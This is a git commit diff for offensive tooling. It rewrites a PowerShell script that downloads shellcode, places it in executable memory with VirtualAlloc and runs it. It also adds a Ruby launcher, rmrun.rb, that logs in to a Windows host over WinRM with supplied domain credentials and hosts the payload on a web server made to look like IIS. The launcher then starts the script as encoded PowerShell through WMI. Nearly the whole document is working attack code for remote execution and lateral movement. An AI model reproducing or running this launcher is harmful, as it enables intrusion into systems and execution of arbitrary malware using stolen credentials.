f86f9acb31a987f25e15dff5a24d6eb51081cf9f
Josh Stone <yakovdk@gmail.com>
2019-07-01 19:39:45 -0500

    WinRM launcher

--- launch/download-execute.ps1
+++ launch/download-execute.ps1
@@ -1,26 +1,9 @@
-function DownloadFile($url) {
-    $uri = New-Object "System.Uri" "$url"
-    $request = [System.Net.HttpWebRequest]::Create($uri)
-    $response = $request.GetResponse()
-    $length = $response.get_ContentLength()
-    $stream = $response.GetResponseStream()
-    $buffer = New-Object byte[] $length
-    $stream.Read($buffer, 0, $length)
-    return $buffer
-}
-function Execute($shellcode) {
-    $code = '[DllImport("kernel32")]public static extern IntPtr VirtualAlloc(IntPtr a, uint b, uint c, uint d);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr a, uint b, IntPtr c, IntPtr d, uint e, IntPtr f);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr a, uint b, uint c);'
-    $winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;
-    $x = $winFunc::VirtualAlloc(0,$shellcode.Length * 2, 0x3000, 0x40);
-
-    for ($i = 0; $i -le $shellcode.Length; $i++) {
-        $result = $winFunc::memset(
-            [IntPtr]::Add($x, $i),
-            $shellcode[$i],
-            1);
-    }
-    $thread = $winFunc::CreateThread(0, 0, [IntPtr]::Add($x, 1), 0, 0, 0);
-    for(;;) { Start-Sleep 60; }
-    return;
-}
-Execute(DownloadFile("FILEURL"))
+$code = '[DllImport("kernel32")]public static extern IntPtr VirtualAlloc(IntPtr a, uint b, uint c, uint d);'
+$win = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;
+$marshal = [System.Runtime.InteropServices.Marshal]
+$nil = [IntPtr].Zero
+$x = Invoke-WebRequest -Uri "FILEURL" -UseBasicParsing
+$p = $win::VirtualAlloc(0,$x.Content.Length * 2, 0x3000, 0x40);
+$marshal::Copy($x.Content, 0, $p, $x.Content.Length)
+$fn = $marshal::GetDelegateForFunctionPointer($p, [System.Action])
+$fn.Invoke()
---
+++ launch/rmrun.rb
@@ -0,0 +1,109 @@
+#!/usr/bin/env ruby
+
+require 'thin'
+require 'pry'
+require 'socket'
+require 'resolv-replace'
+require 'winrm'
+require 'base64'
+require 'time'
+
+$root = File.expand_path(File.dirname(__FILE__))
+
+def pputs(msg)
+  msg.gsub!("", "\x1b[1m")
+  msg.gsub!("", "\x1b[22m")
+  puts("\x1b[s\x1b[35m  \x1b[1m[+]\x1b[22m #{msg}\x1b[u")
+end
+
+if ARGV.length != 5
+  puts("")
+  puts(" usage: rmrun.rb <domain> <user> <pass> <payload> <winrm-url>")
+  puts("")
+  puts("   Uses WinRM to execute a powershell script that will download a shellcode")
+  puts("   payload, load it into executable memory, and execute it in a thread.  The")
+  puts("   user is responsible to provide the webserver where the payload can be")
+  puts("   downloaded.  Uses the 'winrm' ruby gem.")
+  puts("")
+  puts(" Example:")
+  puts("")
+  puts("   $ rmrun.rb AD user Password1 net.shellcode http://192.168.0.2:5985/wsman")
+  puts("")
+  exit(1)
+else
+  pputs("Running WinRM launcher to execute shellcode")
+end
+
+$payload = nil
+File.open(ARGV[3], "rb") do |fd|
+  $payload = fd.read
+end
+
+pputs("Loaded #{$payload.length} bytes of payload")
+
+$downcount = 0
+
+app = Rack::Builder.new do
+  @logger = nil
+  headers = {
+    'Content-Type' => 'application/octet-stream',
+    'Content-Length' => $payload.length.to_s,
+    'Connection' => 'Close',
+    'Server' => 'Microsoft-IIS/8.0',
+    'Vary' => 'Accept-Encoding',
+    'X-UA-Compatible' => 'IE=Edge,chrome=1',
+    'Date' => DateTime::now().strftime("%a, %d %b %Y %H:%M:%S GMT")
+  }
+  run Proc.new { |env| $downcount += 1; [200, headers, [$payload]] }
+end
+
+pputs("Created downloader app")
+
+Thin::Logging.silent = true
+server = Thin::Server.new({:signals => false}, app)
+Thread.new { server.start }
+
+ip = Socket.ip_address_list.detect { |intf| intf.ipv4_private? }.ip_address
+url = "http://#{ip}:#{server.port}/net.shellcode"
+pputs("Started web server at #{url}")
+
+pputs("Connecting to #{ARGV[4]}")
+
+begin
+  opts = {
+    endpoint: ARGV[4],
+    user: "#{ARGV[0]}\\#{ARGV[1]}",
+    transport: :negotiate,
+    password: ARGV[2]
+  }
+  conn = WinRM::Connection.new(opts)
+rescue Exception => e
+  pputs("Error: #{e.message}")
+  exit(3)
+end
+
+script = File.read("#{$root}/download-execute.ps1")
+script.sub!("FILEURL", url)
+enc = Base64.encode64(script.encode("utf-16le")).split(/\n/).map(&:strip).join()
+pputs("Prepared script")
+before = $downcount 
+
+begin
+  conn.shell(:powershell) do |shell|
+    pputs("launching script...")
+    cmd = "Invoke-WmiMethod -path win32_process -name create -argumentlist \"powershell.exe -EncodedCommand #{enc}\""
+    output = shell.run(cmd) { }
+  end
+rescue Exception => e
+  pputs("Process terminated: #{e.class.to_s}")
+end
+
+pputs("Waiting to confirm download...")
+
+while true
+  sleep 0.1
+  break if $downcount > before
+end
+
+sleep(0.1)
+pputs("Payload completed, exiting")
